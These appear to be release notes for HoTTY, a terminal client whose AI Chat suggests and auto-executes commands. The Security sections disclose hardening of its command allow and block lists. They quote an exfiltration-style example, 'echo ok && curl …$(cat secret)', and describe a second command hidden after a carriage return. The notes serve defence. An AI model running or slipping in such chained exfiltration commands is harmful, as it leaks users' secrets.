An **AI Chat** quality pass — safer command review, clearer errors, consistent naming, and better accessibility — plus internal groundwork (a shared conversation-history store and unified error handling) toward faster multi-tab AI. Headline: command safety verdicts now appear in **Ask before execute** mode too, so a blacklisted command is flagged before you run it, not silently.

### Improvements

- **Safety verdicts now appear in "Ask before execute" mode, not just auto mode.** When you review each AI-suggested command by hand, HoTTY now flags a blacklisted command with a 🛑 badge and a whitelisted one with a ✅ badge *before* you press Run. Previously these signals showed only in auto-execute mode, so a dangerous command in ask mode carried no visible warning. The check is instant and makes no AI call.
- **Clearer AI error messages.** When a request to OpenAI, Anthropic or Gemini fails, the chat now names the actual cause — authentication failure, quota / rate limit, model not found, or a provider outage — with a short detail from the provider, instead of the generic *"An error occurred while communicating with …"*. (Vertex AI already did this.)
- **"AI Watch" is now the single name for terminal monitoring.** The tab button, right-click menu and tooltips previously mixed *"Monitor with AI"*, *"AI Monitor"* and *"Watch with AI"*; they now read **AI Watch** / **Start AI Watch** / **Stop AI Watch** consistently.
- **AI Chat accessibility.** The Stop and Send buttons are now labelled for screen readers, streaming replies are announced, the input area can be resized from the keyboard (focus the divider handle, then ↑/↓), and every AI reply has a copy button.
- **The AI Chat message icon now reflects the active provider's brand colour** instead of always showing the Gemini gradient.
- **Smarter empty state and a settings shortcut.** With no terminal linked, the starter suggestions no longer assume terminal output exists, and the execution-mode popover gains a **More safety settings…** link that jumps to Settings → AI.
- **More of the AI Chat is translated** — cancellation, stream-timeout and error text, and tab labels, now follow your UI language.

### Performance

- **AI conversation history is now bounded per tab**, so a very long chat can no longer grow HoTTY's memory without limit.

### Bug Fixes

- **Fixed a stale hint.** The *"select a model"* hint pointed to a header / top-right dropdown that no longer exists; it now points to the AI settings button below the message box, where the model selector actually lives.
- **AI command-safety checks no longer stall behind a long reply.** The safety classification that gates auto-execution could get stuck waiting behind an in-progress chat stream; it now has its own timeout, so the auto-execute decision never hangs.
- **A stalled AI response can no longer wedge the AI features.** If a response stream stops responding and the window is closed mid-stream, a backstop timeout now releases it so other AI actions keep working.

## v2.0.10

The v2.0.10 stable release, consolidating the v2.0.10 beta series plus a File Server reliability pass. The headline changes: a new **Fixed terminal size** option keeps the terminal pinned to the width your network device locked at login (e.g. Huawei USG / VRP), so command-line editing never drifts out of sync; **AI Chat** gains a one-click **Don't Execute** button and a broad reliability pass (per-tab conversations, a dependable Stop, sign-in fixes); command **auto-execution is hardened** against dangerous shell constructs and network/kernel write commands; and **File Server** uploads from network devices now work reliably end-to-end.

### New Features

- **Fixed terminal size — keep the terminal pinned to the width negotiated at connect.** Devices such as Huawei USG / VRP lock their terminal width at login and ignore every later resize, so resizing the HoTTY window made what you see drift out of sync with how the device wraps and edits your command line. The new option pins the terminal grid to the connect-time width instead of reflowing it. Set the default in **Settings → General → Terminal → Fixed terminal size**: *Auto* (the new default) pins only devices HoTTY recognises from the SSH identification, or force it *On* / *Off* for every connection. You can override it per connection in the connection form and in the host tree, or flip it for the current tab from the tab's right-click menu. A pinned terminal tints the unused space beside the grid when the pane is wider than the terminal, and scrolls horizontally when the pane is narrower — the view follows the cursor as you type. The tint is a new themeable colour you can adjust in the custom theme editor.
- **Decline an AI-suggested command with "Don't Execute".** When the AI suggests a command and it's waiting for your confirmation, a new **Don't Execute** button sits next to **Run in Terminal**. Click it to decline the command — the block is marked **Declined** and the AI is told, so instead of the suggestion just hanging there, it acknowledges your choice and can propose a different approach. Declining one command doesn't affect any others.

### Improvements

- **File Server uploads from network devices now work reliably.** The SFTP server now offers an RSA-3072 host key alongside ed25519, so older SSH clients (such as Huawei VRP) can complete the handshake — and a failed handshake is logged instead of silently swallowed. Upload rejections and failures now show up in the pane's transfer log instead of only on the device, missing parent folders in an upload path are created automatically (still confined to the shared folder), and an upload's size is reported when the file is finished rather than showing 0.
- **The File Server firewall check now tells the truth — and fixing it no longer trips Defender.** The Windows Firewall check now sees rules created for HoTTY's own executable (previously a valid allow rule could leave the status stuck on *Blocked*), the status line carries a short reason for *why* traffic is blocked, and the **Allow** button creates the rule via `netsh` — the previous mechanism could trigger a Windows Defender false positive.
- **Friendlier File Server errors.** When a server can't start or a transfer fails, the pane now shows a plain-language reason — *"Port 0.0.0.0:69 is already in use…"*, *"Permission denied binding…"*, *"the disk is full"*, *"access denied"* — instead of a raw Windows error code, and unknown transfer sizes render as "—" instead of a bogus number.
- **Friendlier AI errors.** When a request to your AI provider fails, the chat now shows a short, plain message — *"An error occurred while communicating with <provider>. Please try again."* — instead of a raw technical error. The technical detail is written to the debug log for troubleshooting.

### Bug Fixes

- **Editing a recalled long command no longer jumps the cursor to the previous line on devices that fix their terminal width at login (e.g. Huawei USG / VRP).** HoTTY used to request an 80×24 SSH terminal at connect and only send your real window size afterward — but these devices ignore that later resize, so they wrapped and edited the command line at 80 columns while HoTTY displayed it wider, throwing Backspace off across the wrap boundary. The terminal is now created underneath the connecting overlay, measures its real width, and reports it before the remote terminal is allocated — so the device wraps and edits at the same width you see.
- **Stop now reliably interrupts a streaming AI reply.** Pressing **Stop** while a response was streaming — and HoTTY's own stream watchdog — could get queued behind the very reply it was trying to cancel, so the reply kept going. Cancellation now runs independently of the stream and takes effect immediately; starting a new message also cancels a still-streaming previous one. And when you press **Stop**, only a message *you* typed is restored to the input box for editing and resending — the terminal output and internal notes HoTTY sends to the AI on your behalf are no longer dumped into the prompt.
- **Each AI Chat tab now keeps its own conversation.** Previously every tab in an AI Chat pane shared a single underlying conversation, so a newly opened tab could inherit — and be steered by — an earlier tab's exchanges. Each tab now has its own isolated context: a new tab starts clean, closing a tab frees its history, and switching AI provider clears every tab.
- **The AI model list no longer gets stuck on "Failed to retrieve the AI model list."** Right after sign-in — before the network is back up on resume, or while your access token is still refreshing — the one-shot model fetch could fail and pin that error until you restarted HoTTY. HoTTY now refreshes an expired sign-in token before listing models and retries the fetch a few times with a short backoff before showing the error. The *"select a model"* hint also no longer flashes while the model list is still loading.
- **Sign-in and sign-out now behave correctly across providers.** **Logout** now disconnects *every* AI provider rather than only the one currently selected (which previously left other providers' stored credentials to silently re-authenticate when you switched to them); signing out one provider no longer blocks HoTTY from automatically re-signing-in a *different*, still-authenticated provider; and a failed sign-in attempt while you are already signed in shows the error without wrongly flipping you to signed-out.
- **Only one AI Chat pane opens, and closing it cleans up fully.** Choosing **AI Chat** from the Features menu now focuses the existing pane instead of opening a second one — two panes previously fought over terminal-watch capture. Closing the pane now stops everything it was watching and frees each tab's conversation history, so a watch can't linger or be resurrected after the pane is gone.
- **Disconnecting a watched terminal no longer clears a still-open chat tab.** When several AI Chat tabs were linked to the same terminal and it disconnected, an out-of-date snapshot could close and wipe the history of a tab that should have survived. The surviving tab now keeps its conversation and re-links automatically when the terminal reconnects.
- **Changing the watch buffer size now applies to sessions you're already watching**, not just ones you link afterward.
- **Internal notes to the AI are no longer lost when they arrive together.** Terminal output, "not connected" notes and decline notes that HoTTY sends to the AI on your behalf are now queued, so several arriving while a reply is still streaming can no longer overwrite each other — every one reaches the model.
- **The AI Chat pane's background updates immediately** when you change the terminal background or theme, instead of waiting for the next unrelated refresh.
- **Closing a window now stops the File Server it was running.** With multiple HoTTY windows open, closing a window whose File Server pane had a TFTP or SFTP server running used to leave that server listening until the last window exited. The servers a window started are now stopped when it closes.

### Security

- **Commands with dangerous shell constructs never auto-execute.** Redirection, command substitution, command chaining and `sudo` now block auto-execution in *every* judging mode — previously the AI verdict path could auto-approve a command like `echo ok && curl …$(cat secret)` that the whitelist path would have rejected structurally. Such commands always wait for your confirmation now.
- **AI auto-execute no longer fast-tracks network/kernel *write* commands.** Tools that are safe to query but can also reconfigure the machine — `ip`, `ifconfig`, `route`, `arp`, `netsh`, `sysctl` and `dmesg` — stay on the auto-execute Whitelist only for their read-only forms. Their write subcommands (for example `ip route del`, `ifconfig eth0 down`, `route add`/`del`, `arp -d`/`-s`, `netsh set`/`add`/`delete`/`reset`, `sysctl -w`, `dmesg -c`/`--clear`) are no longer auto-run and now wait for your confirmation.
- **A hidden second command after a carriage return can't slip past the Blacklist.** The Blacklist check now treats a bare carriage return as a command boundary — the same as the Whitelist and the terminal itself — so a blacklisted command tucked after a `\r` is caught instead of being shielded by a benign first token.
- **Linking a terminal to a chat now asks for data-sharing consent** the first time, the same as turning on Watch — because linking a live terminal streams its output to your AI provider. (Unlinking sends nothing and is never gated.)
- **The SFTP server is hardened against misbehaving clients.** A single read request is now capped at 256 KiB (matching OpenSSH), so a client can no longer force a multi-gigabyte memory allocation with one oversized request, and a connection that stalls mid-handshake is dropped after 30 seconds instead of lingering — including when you stop the server.

## v2.0.10-beta4

This beta follows up on beta3's terminal-width fix for network devices that lock their terminal width at login (such as Huawei USG / VRP). Beta3's fix turned out to be incomplete — the size sent at connect was still the 80×24 fallback — so this release both fixes that and adds a **Fixed terminal size** option that keeps the terminal pinned to the width the device actually agreed to.

### New Features

- **Fixed terminal size — keep the terminal pinned to the width negotiated at connect.** Devices such as Huawei USG / VRP lock their terminal width at login and ignore every later resize, so resizing the HoTTY window made what you see drift out of sync with how the device wraps and edits your command line. The new option pins the terminal grid to the connect-time width instead of reflowing it. Set the default in **Settings → General → Terminal → Fixed terminal size**: *Auto* (the new default) pins only devices HoTTY recognises from the SSH identification, or force it *On* / *Off* for every connection. You can override it per connection in the connection form and in the host tree, or flip it for the current tab from the tab's right-click menu. A pinned terminal tints the unused space beside the grid when the pane is wider than the terminal, and scrolls horizontally when the pane is narrower — the view follows the cursor as you type. The tint is a new themeable colour you can adjust in the custom theme editor.

### Bug Fixes

- **The terminal size sent at connect is now really your window size.** v2.0.10-beta3 changed HoTTY to size the initial SSH terminal to your actual window, but the terminal itself was only created *after* the session finished connecting — so it had no measured width to report yet, and the connection still requested the 80×24 fallback. That left the original cursor-jumping problem in place on devices that latch the width. The terminal is now created underneath the connecting overlay, measures its real width, and reports it before the remote terminal is allocated.

## v2.0.10-beta3

This beta fixes a terminal-compatibility issue with network devices that lock their terminal width at login (such as Huawei USG / VRP): editing a command recalled from history no longer sends the cursor jumping to the line above.

### Bug Fixes

- **Editing a recalled long command no longer jumps the cursor to the previous line on devices that fix their terminal width at login (e.g. Huawei USG / VRP).** HoTTY always requested an 80×24 SSH terminal at connect and only sent your real window size afterward — but these devices ignore that later resize, so they wrapped and edited the command line at 80 columns while HoTTY displayed it wider, throwing Backspace off across the wrap boundary. HoTTY now sizes the initial SSH terminal to your actual window, so the device wraps and edits at the same width you see.

## v2.0.10-beta2

This beta is a robustness and safety pass over AI Chat. **Stop** now reliably interrupts a streaming reply, the model list no longer gets stuck on an error right after sign-in, sign-in and sign-out behave correctly across providers, and only one AI Chat pane ever opens. It also tightens command auto-execution: network and kernel tools that can reconfigure the machine no longer auto-run their write subcommands.

### Improvements

- **Friendlier AI errors.** When a request to your AI provider fails, the chat now shows a short, plain message — *"An error occurred while communicating with <provider>. Please try again."* — instead of a raw technical error. The technical detail is written to the debug log for troubleshooting.

### Bug Fixes

- **Stop now reliably interrupts a streaming AI reply.** Pressing **Stop** while a response was streaming — and HoTTY's own stream watchdog — could get queued behind the very reply it was trying to cancel, so the reply kept going. Cancellation now runs independently of the stream and takes effect immediately; starting a new message also cancels a still-streaming previous one.
- **The AI model list no longer gets stuck on "Failed to retrieve the AI model list."** Right after sign-in — before the network is back up on resume, or while your access token is still refreshing — the one-shot model fetch could fail and pin that error until you restarted HoTTY. HoTTY now refreshes an expired sign-in token before listing models and retries the fetch a few times with a short backoff before showing the error.
- **Sign-in and sign-out now behave correctly across providers.** **Logout** now disconnects *every* AI provider rather than only the one currently selected (which previously left other providers' stored credentials to silently re-authenticate when you switched to them); signing out one provider no longer blocks HoTTY from automatically re-signing-in a *different*, still-authenticated provider; and a failed sign-in attempt while you are already signed in shows the error without wrongly flipping you to signed-out.
- **Only one AI Chat pane opens, and closing it cleans up fully.** Choosing **AI Chat** from the Features menu now focuses the existing pane instead of opening a second one — two panes previously fought over terminal-watch capture. Closing the pane now stops everything it was watching and frees each tab's conversation history, so a watch can't linger or be resurrected after the pane is gone.
- **Disconnecting a watched terminal no longer clears a still-open chat tab.** When several AI Chat tabs were linked to the same terminal and it disconnected, an out-of-date snapshot could close and wipe the history of a tab that should have survived. The surviving tab now keeps its conversation and re-links automatically when the terminal reconnects.
- **Changing the watch buffer size now applies to sessions you're already watching**, not just ones you link afterward.
- **Internal notes to the AI are no longer lost when they arrive together.** Terminal output, "not connected" notes and decline notes that HoTTY sends to the AI on your behalf are now queued, so several arriving while a reply is still streaming can no longer overwrite each other — every one reaches the model.
- **The AI Chat pane's background updates immediately** when you change the terminal background or theme, instead of waiting for the next unrelated refresh.

### Security

- **AI auto-execute no longer fast-tracks network/kernel *write* commands.** Tools that are safe to query but can also reconfigure the machine — `ip`, `ifconfig`, `route`, `arp`, `netsh`, `sysctl` and `dmesg` — stay on the auto-execute Whitelist only for their read-only forms. Their write subcommands (for example `ip route del`, `ifconfig eth0 down`, `route add`/`del`, `arp -d`/`-s`, `netsh set`/`add`/`delete`/`reset`, `sysctl -w`, `dmesg -c`/`--clear`) are no longer auto-run and now wait for your confirmation.
- **A hidden second command after a carriage return can't slip past the Blacklist.** The Blacklist check now treats a bare carriage return as a command boundary — the same as the Whitelist and the terminal itself — so a blacklisted command tucked after a `\r` is caught instead of being shielded by a benign first token.
- **Linking a terminal to a chat now asks for data-sharing consent** the first time, the same as turning on Watch — because linking a live terminal streams its output to your AI provider. (Unlinking sends nothing and is never gated.)

## v2.0.10-beta1

This beta adds a **Don't Execute** button so you can decline an AI-suggested command in one click — the AI is told and can offer a different approach — and fixes a set of AI Chat issues: each chat tab now keeps its own conversation, the *"select a model"* hint no longer flashes while models are loading, and stopping a response no longer leaves HoTTY's internal text in the message box.

### New Features

- **Decline an AI-suggested command with "Don't Execute".** When the AI suggests a command and it's waiting for your confirmation, a new **Don't Execute** button sits next to **Run in Terminal**. Click it to decline the command — the block is marked **Declined** and the AI is told, so instead of the suggestion just hanging there, it acknowledges your choice and can propose a different approach. Declining one command doesn't affect any others.

### Bug Fixes

- **Each AI Chat tab now keeps its own conversation.** Previously every tab in an AI Chat pane shared a single underlying conversation, so a newly opened tab could inherit — and be steered by — an earlier tab's exchanges. Each tab now has its own isolated context: a new tab starts clean, closing a tab frees its history, and switching AI provider clears every tab.
- **The "select a model" hint no longer flashes on startup.** The *"Select a model in the header to send messages"* hint no longer appears for a moment while the model list is still loading (your previously-used model auto-selects a beat later), and it stays hidden when the model list can't be loaded. It now shows only once models are available but none is selected.
- **Stopping an AI response no longer drops internal text into the message box.** When you press **Stop** during a reply, only a message *you* typed is restored to the input box for editing and resending. The terminal output and internal notes HoTTY sends to the AI on your behalf are no longer dumped into the prompt, and anything you were typing while the response streamed is left untouched.

## v2.0.9

The v2.0.9 stable release, consolidating the v2.0.9 beta series. The headline change is a reworked **AI sign-in**: credentials for every provider now live in **Settings → AI**, your signed-in state is shared across all open windows and remembered between launches, and the in-app AI setup help is expanded with step-by-step instructions and troubleshooting. This release also makes the **New Connection** form remember what you typed after connecting, and gives clearer, plain-language messages when a connection can't be started.

### Improvements

- **AI sign-in has moved to Settings → AI.** You now enter your credentials for every provider — Gemini, Vertex AI, OpenAI and Anthropic — in **Settings → AI**, directly below the provider selector, alongside your authentication status and a **Logout** button. The AI Chat pane no longer has any credential fields; while you are not signed in it shows a **Not signed in** message with an **Open Settings** button that jumps straight to the AI tab.
- **Your AI sign-in is now shared across windows and remembered between launches.** Signing in — or out — in one window is reflected in every open window, and HoTTY re-authenticates automatically the next time you start it, so you only sign in once. OpenAI and Anthropic API keys are now kept (encrypted with Windows DPAPI) for this automatic re-sign-in as well.
- **Clearer AI setup help.** The in-app Help walks you through creating credentials for each provider step by step — including the easily-missed **Test users** step on Google's OAuth consent screen — and adds an **"If sign-in fails"** troubleshooting section covering the most common sign-in errors.
- **The New Connection form now keeps your entries after connecting.** When you connect from a manually-entered **New Connection** (no saved host selected), the dialog keeps the values you typed — host, port, username and the rest — so the next time you open it, it's already pre-filled for a similar host. Connecting to a saved host or a GCP instance still clears the form as before, so a saved host's decrypted password is never left in the fields.
- **Friendlier connection errors.** When a connection can't be started, HoTTY now shows a plain-language reason instead of the raw Windows system message — for serial ports (*"Serial port COM3 is in use or access was denied"* / *"…not found"*), and now also for local shell, WSL and GCP IAP sessions (for example *"wsl.exe not found — check that it is installed and the path is correct"*).
- **Text Editor and File Explorer panes are off by default on new installs.** A fresh install now starts with the Text Editor and File Explorer panes disabled in the Features menu; turn either on any time in **Settings → Features**. Existing installs keep the panes you already had enabled.

### Bug Fixes

- **New Connection no longer shows Telnet paired with the wrong default port.** When the form was cleared back to a fresh **New Connection** — for example after connecting a saved Telnet host, or clicking **New Connection** while a Telnet host was selected — the protocol stayed on **Telnet** while the port was reset to **22** (SSH's default), leaving an inconsistent *Telnet + port 22*. The form now resets protocol and port together, so a fresh New Connection always starts as **SSH on port 22**.
- **You're now told when an accepted SSH host key can't be saved.** If HoTTY accepted a new SSH host key but then failed to write it to `known_hosts`, it previously failed silently — so you would be asked to confirm the same host again on your next connection with no explanation. It now shows a notification when this happens.

## v2.0.9-beta3

This beta fixes a **New Connection** form glitch introduced by the beta2 entry-retention change, where the protocol and port could fall out of sync.

### Bug Fixes

- **New Connection no longer shows Telnet paired with the wrong default port.** When the form was cleared back to a fresh **New Connection** — for example after connecting a saved Telnet host, or clicking **New Connection** while a Telnet host was selected — the protocol stayed on **Telnet** while the port was reset to **22** (SSH's default), leaving an inconsistent *Telnet + port 22*. The form now resets protocol and port together, so a fresh New Connection always starts as **SSH on port 22**.

## v2.0.9-beta2

This beta makes the **New Connection** form remember what you typed after you connect, so reopening the dialog is pre-filled for your next similar host.

### Improvements

- **The New Connection form now keeps your entries after connecting.** When you connect from a manually-entered **New Connection** (no saved host selected), the dialog keeps the values you typed — host, port, username and the rest — so the next time you open it, it's already pre-filled for a similar host. Connecting to a saved host or a GCP instance still clears the form as before, so a saved host's decrypted password is never left in the fields.

## v2.0.9-beta1

This beta reworks **AI sign-in**: credentials for every provider now live in **Settings → AI** instead of the AI Chat pane, your signed-in state is shared across all open windows and remembered between launches, and the in-app AI setup help has been expanded with step-by-step instructions and troubleshooting. It also makes serial-port connection failures easier to read.

### Improvements

- **AI sign-in has moved to Settings → AI.** You now enter your credentials for every provider — Gemini, Vertex AI, OpenAI and Anthropic — in **Settings → AI**, directly below the provider selector, alongside your authentication status and a **Logout** button. The AI Chat pane no longer has any credential fields; while you are not signed in it shows a **Not signed in** message with an **Open Settings** button that jumps straight to the AI tab.
- **Your AI sign-in is now shared across windows and remembered between launches.** Signing in — or out — in one window is reflected in every open window, and HoTTY re-authenticates automatically the next time you start it, so you only sign in once. OpenAI and Anthropic API keys are now kept (encrypted with Windows DPAPI) for this automatic re-sign-in as well.
- **Clearer AI setup help.** The in-app Help walks you through creating credentials for each provider step by step — including the easily-missed **Test users** step on Google's OAuth consent screen — and adds an **"If sign-in fails"** troubleshooting section covering the most common sign-in errors.
- **Friendlier serial-port connection errors.** When a COM port can't be opened, HoTTY now shows a plain-language reason — for example *"Serial port COM3 is in use or access was denied"* or *"…not found"* — instead of the raw Windows system message.

## v2.0.8

The v2.0.8 stable release, consolidating the v2.0.8 beta series. The headline additions are **multi-window support**, a redesigned free-form **"Ask AI"** on terminal selections, and a round of **Web Browser** enhancements (page zoom, persistent logins, clear-browsing-data, Open All, and folder sorting) — together with a broad **security and stability hardening** pass across AI auto-execution, SSH host-key handling, and multi-window session isolation.

### Breaking Changes

- **Customizable "Ask AI Commands" have been removed.** The preset right-click commands (such as "What is this?" and "Fix this") and the **Settings → AI → Ask AI Commands** editor are gone, replaced by the free-form inline **Ask AI** box (below). Any custom Ask AI commands you configured will no longer appear.

### New Features

- **Open multiple windows in one process.** Open a new HoTTY window from the sidebar's **New Window** button or **Ctrl + Shift + N** — and launching HoTTY again now opens another window in the existing process instead of a separate copy. Each window keeps its own pane layout and terminal sessions, while your settings, theme, host tree and bookmarks stay shared and in sync across every open window. Closing a window cleans up only that window's sessions.
- **Link an AI Chat to a terminal in another window.** The AI Chat pane's link picker lists terminals from every open window, grouped by window, so a chat in one window can watch and drive a session running in another.
- **Ask the AI about terminal output with a right-click.** Select text in a terminal, right-click the selection, and type your question in the inline **"Ask AI"** box — **Enter** sends (**Shift + Enter** for a new line). HoTTY opens or focuses the AI Chat pane and sends your question together with the selected text. (Click a Terminal Marker first to select a whole output block.)
- **One-time AI data-sharing notice.** The first time an AI feature would send terminal data to your configured provider, HoTTY shows a brief disclosure of what is sent, when, and how known secrets are redacted — you confirm once before anything is sent. Review it, see your consent status, or reset it any time in **Settings → AI → Data Handling**.
- **Third-Party Licenses viewer.** **Settings → About → Third-Party Licenses** lists the open-source projects bundled with HoTTY together with their license texts.
- **Web Browser — page zoom.** Zoom the current page from the toolbar (also with **Ctrl + mouse wheel** and **Ctrl + +/−/0**), set a default zoom that new panes start at, and make the current zoom the default. Each pane keeps its own zoom for the session.
- **Web Browser — clear browsing data.** From the toolbar's **⋯ More** menu, clear cookies & site data, cached images and files, browsing history, saved passwords and autofill data — you choose what to remove. Clearing cookies signs you out of the sites you visited; your bookmarks and HoTTY's own settings are always kept.
- **Web Browser — Open All in a folder.** Right-click a folder — in the host tree, on the New Session dialog's 🌐 Web tab, or in the Web Browser's bookmarks list — and choose **Open All** to connect to every host, or open every bookmarked site each in its own browser pane (including items in sub-folders). Folders with 5 or more items ask for confirmation first.
- **Web Browser — persistent session logins.** Sites that sign you in with a session cookie (for example the Cisco Meraki dashboard), which WebView2 previously discarded on close, now stay signed in across restarts.
- **Sort folders ascending or descending.** Host-tree folders and web-bookmark folders can now be sorted in either direction from the folder's right-click menu (descending is new).

### Improvements

- **Web Browser toolbar decluttered.** Less-frequent actions — including clear browsing data — now live in a **⋯ More** menu, and the clear-data category choices appear inline in that menu instead of in a separate pop-up dialog.

### Bug Fixes

- **Multi-window stability.** Running an AI command against a terminal owned by another window now works (it previously failed with "[not connected]"); a setting changed in one window syncs live to the others without simultaneous edits clobbering each other; two windows can watch the same terminal for AI without one wiping the other's captured output; and window-targeted actions — the AI "bring window to front", the terminal right-click menu, and the GCP IAP "start VM?" prompt — now act on the window that owns the session instead of the main window.
- **One stuck connection no longer freezes everything.** A single unresponsive SSH/Telnet peer could block typing, resizing and opening or closing across all sessions and windows; each session is now isolated, so only the affected one waits.
- **Idle local and WSL sessions are fully cleaned up on close.** Closing a local shell or WSL session that was sitting idle previously left its underlying process and reader threads running; they are now terminated on disconnect.
- **Web Browser: no more stray view after a fast close.** Closing a Web Browser tab immediately after opening it could leave a native browser view painted over the UI until restart; this race is fixed.
- **Telnet: robust to non-ASCII login banners.** A telnet server that sent a long multi-byte banner before the login prompt could crash the connection's reader; fixed.
- **Host-key and config files are saved crash-safely.** A rare failure while replacing `known_hosts` or a config file can no longer leave it empty or truncated — the previous contents are kept until the new file is safely in place — and accepting a new host key in two windows at the same time no longer risks dropping one of them.

### Security

- **AI auto-execute is harder to slip past.** In *auto-execute-safe* mode: interpreter and "runner" commands that can run arbitrary code or write files (`env`, `awk`, `sed`, `find`, `git`, shells and similar) are no longer fast-tracked by the whitelist; the network tools `curl`, `wget` and `nmap` were removed from the default whitelist (closing a data-exfiltration path); a bare `&` separator is treated as command chaining; whitelist phrases must match from the start of a command; and a carriage return embedded in a command is now treated as a command boundary, so a whitelisted first token can no longer shield a hidden second command after it.
- **Terminal output sent to the AI is redacted for secrets.** Watched terminal output, selected text and auto-execution results now have passwords, API keys, tokens and `Bearer` headers redacted before they are sent to your AI provider.
- **AI Chat links open safely.** A link in an AI response now opens through HoTTY's confirmed external-open path (which shows the full URL for your approval) instead of navigating the app window to it in place — closing a phishing / UI-spoofing vector.
- **An SSH host-key change is no longer downgraded to a "new host" prompt.** If a known host presents a key of a different type than the one on record, HoTTY now shows the "host key changed — possible MITM" warning instead of the milder "new host" prompt.
- **The SSH host-key prompt is no longer cancelled by the connection timeout.** The host-key confirmation (including the "HOST KEY CHANGED" warning) now stays open for your decision even though the network handshake still fails fast.
- **Web Browser session-cookie persistence is scoped to the page you're viewing.** Keeping a site's session login signed in no longer re-stamps every cookie in the shared browser profile (including HoTTY's own) as long-lived — only cookies for the current page are affected.
- **File Server: upload-path symlink escape closed.** The built-in TFTP/SFTP server's write path resolves and rejects a final-component symlink (including a dangling one), so a symlink planted inside the served folder can no longer redirect an upload outside it.

## v2.0.8-beta5

This beta is a broad **stability and security hardening** pass — with fixes across multi-window support, SSH host-key handling, and AI auto-execution — and adds a **page zoom** control to the Web Browser.

### New Features

- **Web Browser page zoom.** The Web Browser toolbar has a new zoom control: zoom the current page in and out (also with **Ctrl + mouse wheel** and **Ctrl + +/−/0**), set a default zoom that new panes start at, and make the current zoom the default. Each pane keeps its own zoom for the session. The toolbar has also been decluttered.

### Bug Fixes

- **Running an AI command against a terminal in another window now works.** With the AI Chat linked to a session owned by a different window, executing a command previously failed with "[not connected]"; cross-window execution now works, as intended for cross-window links.
- **Settings now sync live between windows.** Changing a setting (theme, font size, and so on) in one window updates every other open window immediately, and simultaneous edits to different settings in different windows no longer overwrite each other.
- **One stuck connection no longer freezes everything.** A single unresponsive SSH/Telnet peer could block typing, resizing and opening or closing across all sessions and windows; each session is now isolated, so only the affected one waits.
- **Idle local and WSL sessions are fully cleaned up on close.** Closing a local shell or WSL session that was sitting idle previously left its underlying process and reader threads running; they are now terminated on disconnect.
- **Two windows can watch the same terminal for AI independently.** Watching one session from two windows no longer lets one window wipe or steal the other's captured output; capture stops only when the last watching window stops.
- **Web Browser: no more stray view after a fast close.** Closing a Web Browser tab immediately after opening it could leave a native browser view painted over the UI until restart; this race is fixed.
- **Multi-window: correct window targeting.** In a secondary window, the AI "bring window to front" action and the terminal right-click menu no longer target the main window, and the GCP IAP "start VM?" prompt now appears only in the window that owns the session instead of in every window.
- **Telnet: robust to non-ASCII login banners.** A telnet server that sent a long multi-byte (for example non-ASCII) banner before the login prompt could crash the connection's reader; fixed.
- **Host-key and config files are saved crash-safely.** A rare failure while replacing `known_hosts` or a config file can no longer leave it empty or truncated — the previous contents are kept until the new file is safely in place — and accepting a new host key in two windows at the same time no longer risks dropping one of them.

### Security

- **AI auto-execute no longer fast-tracks interpreter or "runner" commands.** In *auto-execute-safe* mode, commands that can run arbitrary code or have an exec/file-write escape hatch — `env`, `awk`, `sed`, `find`, `git`, shells and similar — are no longer auto-run via the whitelist; they are deferred to the AI's read-only verdict or a manual confirmation. A bare `&` command separator is now treated as command chaining. This closes ways a destructive command could slip through the auto-execute safety check.
- **Terminal output sent to the AI is redacted for secrets.** Watched terminal output, selected text and auto-execution results now have passwords, API keys, tokens and `Bearer` headers redacted before they are sent to your AI provider.
- **An SSH host-key change is no longer downgraded to a "new host" prompt.** If a known host presents a key of a different type than the one on record, HoTTY now shows the "host key changed — possible MITM" warning instead of the milder "new host" prompt, closing a downgrade an attacker could exploit.
- **The SSH host-key prompt is no longer cancelled by the connection timeout.** The host-key confirmation (including the "HOST KEY CHANGED" warning) was previously killed by the short connect timeout (default 5 seconds) before you could read the fingerprint — failing the connection and orphaning the prompt. The network handshake still fails fast, but the prompt now stays open for your decision.
- **Web Browser session-cookie persistence is scoped to the page you're viewing.** Keeping a site's session login signed in no longer re-stamps every cookie in the shared browser profile (including HoTTY's own) as long-lived — only cookies for the current page are affected.

## v2.0.8-beta4

This beta adds an **Open All** command to host and bookmark folders, so you can launch everything in a folder in one action.

### New Features

- **Open every host or bookmark in a folder at once.** Right-click a folder — in the host tree (New Session dialog), on the New Session dialog's 🌐 Web tab, or in the Web Browser's in-page bookmarks list — and choose **Open All**. HoTTY connects to every host in that folder, or opens every bookmarked site each in its own browser pane, including items nested in sub-folders. When a folder holds 5 or more items you're asked to confirm first, so a large batch never opens by accident.

## v2.0.8-beta3

This beta makes the embedded **Web Browser** keep you signed in to more sites across restarts, and adds a **Clear browsing data** dialog so you can wipe cookies, cache, history and saved passwords on demand.

### New Features

- **Clear the Web Browser's browsing data.** A new trash button in the Web Browser toolbar opens a **Clear browsing data** dialog where you choose what to remove — cookies & site data, cached images and files, browsing history, saved passwords, and autofill data — then confirm. Clearing cookies signs you out of the sites you visited. Your bookmarks and HoTTY's own settings are always kept.

### Bug Fixes

- **Web Browser logins that rely on session cookies now survive a restart.** Some sites (for example the Cisco Meraki dashboard) sign you in with a session cookie, which WebView2 discarded when HoTTY closed — so you were signed out on the next launch even though the browser's profile is persistent. HoTTY now preserves these sessions, so those logins are remembered across restarts like other sites.

## v2.0.8-beta2

This beta adds **multi-window support** — open multiple HoTTY windows in a single process, each with its own panes and terminal sessions while sharing your settings, theme, host tree and bookmarks. It also introduces a one-time **AI data-sharing notice** and a **Third-Party Licenses** viewer.

### New Features

- **Open multiple windows in one process.** Open a new HoTTY window from the new **New Window** button in the sidebar or with **Ctrl + Shift + N** — and launching HoTTY again now opens another window in the existing process instead of a separate copy. Each window keeps its own pane layout and terminal sessions, while your settings, theme, host tree and bookmarks stay shared and in sync across every open window. Closing a window cleans up only that window's sessions.
- **Link an AI Chat to a terminal in another window.** The AI Chat pane's link picker now lists terminals from every open window, grouped by window, so a chat in one window can watch and drive a session running in another. Sessions are shared app-wide, so Watch Mode and command execution work across windows.
- **One-time AI data-sharing notice.** The first time an AI feature would send terminal data to your configured provider, HoTTY now shows a brief disclosure of what is sent, when, and how known secrets are redacted — you confirm once before anything is sent. You can review the disclosure, see your consent status, and reset it (**Show again**) any time in **Settings → AI → Data Handling**.
- **Third-Party Licenses viewer.** **Settings → About → Third-Party Licenses** now lists the open-source projects bundled with HoTTY together with their license texts.

## v2.0.8-beta1

